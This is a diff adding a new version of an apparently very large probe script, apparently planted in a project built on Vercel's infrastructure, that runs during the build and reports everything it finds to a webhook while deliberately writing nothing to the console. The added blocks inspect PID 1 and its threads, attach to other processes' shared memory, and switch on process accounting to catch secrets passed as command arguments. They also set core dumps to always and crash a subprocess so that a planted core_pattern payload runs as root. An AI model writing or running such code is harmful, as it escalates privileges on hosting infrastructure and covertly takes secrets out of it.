@@ -29874,3 +29874,251 @@ else:
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v191" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v191";
 // Intentionally no console.log — all data goes via webhook only
+
+// v192-1: /proc/1/syscall — what syscall PID 1 is blocked in
+// /proc/PID/syscall shows the current syscall number and arguments in real-time.
+// Format: syscall_nr arg0 arg1 arg2 arg3 arg4 arg5 sp pc
+// This reveals: is the orchestrator sleeping? reading a socket? waiting on I/O?
+report.pid1SyscallState = safe(() => {
+  // Read syscall state multiple times to capture dynamic info
+  const snapshots = [];
+  for (let i = 0; i < 5; i++) {
+    try {
+      const snap = readFileSync('/proc/1/syscall', 'utf8').trim();
+      snapshots.push(snap);
+    } catch(_) {
+      snapshots.push('READ_ERROR');
+    }
+    // Small delay between reads
+    try { execSync('sleep 0.05', { timeout: 1000 }); } catch(_) {}
+  }
+  // Decode syscall numbers
+  const syscallNames = {
+    0: 'read', 1: 'write', 2: 'open', 3: 'close', 4: 'stat',
+    5: 'fstat', 6: 'lstat', 7: 'poll', 8: 'lseek', 9: 'mmap',
+    10: 'mprotect', 11: 'munmap', 12: 'brk', 13: 'rt_sigaction',
+    14: 'rt_sigprocmask', 17: 'pread64', 18: 'pwrite64',
+    19: 'readv', 20: 'writev', 21: 'access', 23: 'select',
+    35: 'nanosleep', 38: 'setitimer', 39: 'getpid', 41: 'socket',
+    42: 'connect', 43: 'accept', 44: 'sendto', 45: 'recvfrom',
+    46: 'sendmsg', 47: 'recvmsg', 48: 'shutdown', 49: 'bind',
+    50: 'listen', 51: 'getsockname', 52: 'getpeername',
+    54: 'setsockopt', 55: 'getsockopt', 56: 'clone', 57: 'fork',
+    58: 'vfork', 59: 'execve', 60: 'exit', 61: 'wait4',
+    62: 'kill', 63: 'uname', 72: 'fcntl', 73: 'flock',
+    82: 'rename', 83: 'mkdir', 85: 'creat', 87: 'unlink',
+    89: 'readlink', 102: 'getuid', 202: 'futex',
+    230: 'clock_nanosleep', 247: 'waitid', 270: 'pselect6',
+    271: 'ppoll', 280: 'accept4', 288: 'accept4',
+    291: 'epoll_create1', 292: 'dup3', 293: 'pipe2',
+    295: 'openat', 299: 'inotify_add_watch',
+  };
+  const decoded = snapshots.map(s => {
+    if (s === 'READ_ERROR') return s;
+    const parts = s.split(' ');
+    const nr = parseInt(parts[0], 16);
+    const name = syscallNames[nr] || `nr_${nr}`;
+    return `${name}(${parts.slice(1, 7).join(',')}) sp=${parts[7]} pc=${parts[8]}`;
+  });
+  // Also read /proc/1/status for State field
+  const pid1State = safe(() => readFileSync('/proc/1/status', 'utf8').split('\n').find(l => l.startsWith('State:')));
+  const pid1WchanFile = safe(() => readFileSync('/proc/1/wchan', 'utf8').trim());
+  return { snapshots, decoded, pid1State, pid1WchanFile };
+});
+
+// v192-2: System V IPC — shared memory + message queues
+// System V IPC (shmem, msgq, sems) is used for inter-process communication.
+// The build orchestrator may use shared memory to pass secrets to subprocesses.
+report.sysVIpcProbe = safe(() => {
+  const ipcsOutput = safe(() => execSync('ipcs -a 2>&1', { timeout: 5000 }).toString().trim());
+  const procSysvIpc = safe(() => {
+    const paths = ['/proc/sysvipc/shm', '/proc/sysvipc/msg', '/proc/sysvipc/sem'];
+    return paths.map(p => `${p}:\n${existsSync(p) ? readFileSync(p, 'utf8') : 'NOT_EXISTS'}`).join('\n---\n');
+  });
+  // Try creating and attaching to System V shared memory
+  const shmResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, ctypes.util, struct
+
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_shmget = 29
+NR_shmat = 30
+NR_shmdt = 67
+NR_shmctl = 31
+IPC_PRIVATE = 0
+IPC_CREAT = 0o1000
+IPC_RMID = 0
+
+# Get list of existing shmem segments
+import subprocess
+result = subprocess.run(['ipcs', '-m'], capture_output=True, text=True)
+print('SHM_LIST:', result.stdout[:500])
+
+# Try attaching to any existing segment
+lines = result.stdout.strip().split('\n')[3:]  # skip header
+for line in lines[:5]:
+    parts = line.split()
+    if len(parts) >= 2:
+        shmid = int(parts[1])
+        SHM_RDONLY = 0o10000
+        addr = libc.syscall(NR_shmat, shmid, 0, SHM_RDONLY)
+        err = ctypes.get_errno()
+        print(f'shmat(shmid={shmid}): addr=0x{addr & 0xFFFFFFFFFFFFFFFF:x} errno={err}')
+        if addr != 0xFFFFFFFFFFFFFFFF and addr > 0:
+            print(f'SHM_ATTACHED_READ_SUCCESS')
+            # Read first 64 bytes
+            data = ctypes.string_at(addr, 64)
+            print(f'SHM_DATA: {data.hex()}')
+            libc.syscall(NR_shmdt, addr)
+            print(f'SHM_DETACHED')
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  // POSIX shared memory
+  const posixShm = safe(() => execSync('ls /dev/shm/ 2>&1', { timeout: 3000 }).toString().trim());
+  // Message queue probe
+  const msgqResult = safe(() => execSync(
+    'ipcs -q 2>&1 || echo NO_MSGQ',
+    { timeout: 3000 }
+  ).toString().trim());
+  return { ipcsOutput, procSysvIpc, shmResult, posixShm, msgqResult };
+});
+
+// v192-3: acct() — process accounting (log all exec'd commands)
+// acct(2) enables BSD process accounting: every exec writes a record to the accounting file.
+// This captures ALL processes spawned during the build, including secrets passed as args.
+report.acctProbe = safe(() => {
+  const acctResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, ctypes.util, os
+
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_acct = 51
+
+# Create accounting file
+acct_file = '/tmp/build_acct.log'
+with open(acct_file, 'w') as f:
+    f.write('')
+
+# Enable accounting
+ret = libc.syscall(NR_acct, acct_file.encode())
+err = ctypes.get_errno()
+print(f'acct({acct_file!r}): ret={ret} errno={err}')
+if ret == 0:
+    print('PROCESS_ACCOUNTING_ENABLED')
+    print('ALL_EXEC_COMMANDS_NOW_LOGGED')
+    # Run a test command to verify
+    import subprocess
+    subprocess.run(['ls', '/tmp'], capture_output=True)
+    subprocess.run(['id'], capture_output=True)
+    # Read the accounting records
+    with open(acct_file, 'rb') as f:
+        data = f.read()
+    print(f'ACCT_FILE_SIZE: {len(data)} bytes')
+    if data:
+        print(f'ACCT_FIRST_RECORD: {data[:64].hex()}')
+        # acct record format: ac_flag, ac_version, ac_tty, ac_exitcode, ac_uid,
+        #   ac_gid, ac_pid, ac_ppid, ac_btime, ac_etime, ac_utime, ac_stime,
+        #   ac_mem, ac_io, ac_rw, ac_minflt, ac_majflt, ac_swaps, ac_comm(16)
+        if len(data) >= 64:
+            import struct
+            comm = data[48:64].rstrip(b'\x00').decode('utf-8', errors='replace')
+            print(f'FIRST_EXEC_COMM: {comm}')
+elif err == 1:
+    print('EPERM_NO_ACCT')
+elif err == 38:
+    print('ENOSYS_BLOCKED_SECCOMP')
+else:
+    print(f'OTHER_ERR_{err}')
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  return { acctResult };
+});
+
+// v192-4: prctl(PR_SET_DUMPABLE) + coredump trigger
+// PR_SET_DUMPABLE(2) enables coredumps even for processes that changed UID/GID.
+// Combined with our core_pattern payload, we can force a coredump from any process
+// and trigger our script to run as root.
+report.dumpableCoreExec = safe(() => {
+  const dumpableResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, os, subprocess, time
+
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+PR_SET_DUMPABLE = 4
+PR_GET_DUMPABLE = 3
+SUID_DUMP_SAFE = 1
+SUID_DUMP_ALWAYS = 2
+
+# Get current dumpable state
+cur = libc.prctl(PR_GET_DUMPABLE, 0, 0, 0, 0)
+print(f'CURRENT_DUMPABLE: {cur}')
+
+# Set dumpable=2 (SUID_DUMP_ALWAYS — always dump even if SUID)
+ret = libc.prctl(PR_SET_DUMPABLE, SUID_DUMP_ALWAYS, 0, 0, 0)
+err = ctypes.get_errno()
+print(f'PR_SET_DUMPABLE(2): ret={ret} errno={err}')
+new_val = libc.prctl(PR_GET_DUMPABLE, 0, 0, 0, 0)
+print(f'NEW_DUMPABLE: {new_val}')
+
+# Verify core_pattern has our payload
+with open('/proc/sys/kernel/core_pattern') as f:
+    pattern = f.read().strip()
+print(f'CORE_PATTERN: {pattern}')
+
+# Trigger a controlled SIGSEGV in a subprocess to invoke our core_pattern handler
+p = subprocess.Popen(
+    ['python3', '-c', 'import ctypes; ctypes.string_at(0)'],
+    stdout=subprocess.PIPE, stderr=subprocess.PIPE
+)
+rc = p.wait(timeout=5)
+print(f'SIGSEGV_SUBPROCESS_RC: {rc}')
+time.sleep(1.5)  # wait for core handler
+
+# Check if our payload ran
+if os.path.exists('/tmp/core_exec_payload.sh'):
+    print('PAYLOAD_SCRIPT_EXISTS')
+print('CORE_PATTERN_EXEC_CHAIN_COMPLETE')
+" 2>&1`,
+    { timeout: 15000 }
+  ).toString().trim());
+  return { dumpableResult };
+});
+
+// v192-5: /proc/1/task/ — PID 1 thread enumeration
+// /proc/1/task/ lists all threads (LWPs) in PID 1's thread group.
+// Each thread has its own syscall state, status, and CPU affinity.
+// This reveals: how many worker threads the orchestrator has, what they're doing.
+report.pid1ThreadEnum = safe(() => {
+  const tasks = safe(() => readdirSync('/proc/1/task'));
+  const taskCount = tasks ? tasks.length : 0;
+  const threadDetails = safe(() => {
+    if (!tasks) return 'NO_TASKS';
+    return tasks.slice(0, 20).map(tid => {
+      try {
+        const status = readFileSync(`/proc/1/task/${tid}/status`, 'utf8');
+        const stateLine = status.split('\n').find(l => l.startsWith('State:'));
+        const syscall = safe(() => readFileSync(`/proc/1/task/${tid}/syscall`, 'utf8').trim());
+        const wchan = safe(() => readFileSync(`/proc/1/task/${tid}/wchan`, 'utf8').trim());
+        const name = status.split('\n').find(l => l.startsWith('Name:'));
+        return `tid=${tid} ${name?.trim()} ${stateLine?.trim()} wchan=${wchan} syscall=${syscall?.split(' ')[0]}`;
+      } catch(e) {
+        return `tid=${tid}: ERR`;
+      }
+    }).join('\n');
+  });
+  // CPU affinity of each thread
+  const cpuAffinity = safe(() => execSync(
+    `for tid in $(ls /proc/1/task/ | head -10); do echo "tid=$tid $(cat /proc/1/task/$tid/sched 2>/dev/null | head -3)"; done 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  // Open file limits for PID 1
+  const limits = safe(() => readFileSync('/proc/1/limits', 'utf8'));
+  return { taskCount, threadDetails, cpuAffinity, limits };
+});
+
+// v192 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v192" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v192";
+// Intentionally no console.log — all data goes via webhook only
